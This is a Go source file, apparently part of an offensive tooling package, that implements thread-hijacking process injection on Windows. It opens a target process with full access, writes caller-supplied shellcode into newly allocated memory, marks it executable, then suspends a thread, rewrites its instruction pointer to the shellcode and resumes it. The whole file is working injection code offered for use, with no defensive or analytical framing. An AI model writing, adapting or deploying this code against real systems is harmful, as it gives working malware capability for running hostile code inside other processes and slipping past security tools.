// +build windows

package injection

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// ThreadHijackInjector implements thread hijacking injection
type ThreadHijackInjector struct{}

// Method returns the injection method
func (i *ThreadHijackInjector) Method() InjectionMethod {
	return MethodThreadHijack
}

// Description returns a description of the injection method
func (i *ThreadHijackInjector) Description() string {
	return "Thread Hijacking: Hijacks an existing thread in the target process to execute shellcode. " +
		"Steps: SuspendThread -> GetThreadContext -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread"
}

// Inject performs thread hijacking injection
func (i *ThreadHijackInjector) Inject(config *Config) (*Result, error) {
	// Validate configuration
	if err := config.Validate(i.Method()); err != nil {
		return &Result{Success: false, Error: err.Error()}, err
	}

	// 1. Find all threads in the target process
	threads, err := FindThreadsByProcessID(uint32(config.TargetPID))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to find threads: %v", err),
		}, err
	}

	if len(threads) == 0 {
		return &Result{
			Success: false,
			Error:   "no threads found in target process",
		}, fmt.Errorf("no threads found in target process")
	}

	// 2. Open the target process
	process, err := OpenProcess(PROCESS_ALL_ACCESS, false, uint32(config.TargetPID))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to open process %d: %v", config.TargetPID, err),
		}, err
	}
	defer windows.CloseHandle(process)

	// 3. Allocate memory in the target process
	addr, err := VirtualAllocEx(process, 0, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to allocate memory in process: %v", err),
		}, err
	}

	// 4. Write shellcode to the allocated memory
	_, err = WriteProcessMemory(process, addr, config.Shellcode)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to write shellcode: %v", err),
		}, err
	}

	// 5. Change memory protection to executable
	_, err = VirtualProtectEx(process, addr, uintptr(len(config.Shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to change memory protection: %v", err),
		}, err
	}

	// 6. Try to hijack a thread (try all threads until one succeeds)
	var success bool
	var lastError error
	var hijackedThreadID uint32

	for _, threadID := range threads {
		// Open the thread
		thread, err := windows.OpenThread(THREAD_ALL_ACCESS, false, threadID)
		if err != nil {
			lastError = err
			continue
		}

		// Suspend the thread
		_, err = SuspendThread(thread)
		if err != nil {
			windows.CloseHandle(thread)
			lastError = err
			continue
		}

		// Get the thread context
		ctx, err := GetThreadContext(thread)
		if err != nil {
			// Resume thread before trying next one
			ResumeThread(thread)
			windows.CloseHandle(thread)
			lastError = err
			continue
		}

		// Save the original instruction pointer (optional, for later restoration)
		// Note: In a real scenario, you might want to save this and restore it after shellcode execution
		// originalRIP := ctx.Rip

		// Modify the instruction pointer to point to the shellcode
		ctx.Rip = uint64(addr)

		// Set the modified context
		err = SetThreadContext(thread, ctx)
		if err != nil {
			// Resume thread before trying next one
			ResumeThread(thread)
			windows.CloseHandle(thread)
			lastError = err
			continue
		}

		// Resume the thread with the new context
		_, err = ResumeThread(thread)
		if err != nil {
			windows.CloseHandle(thread)
			lastError = err
			continue
		}

		// Success!
		success = true
		hijackedThreadID = threadID
		windows.CloseHandle(thread)
		break
	}

	if !success {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to hijack any thread: %v", lastError),
		}, lastError
	}

	return &Result{
		Success:   true,
		ProcessID: uint32(config.TargetPID),
		ThreadID:  hijackedThreadID,
	}, nil
}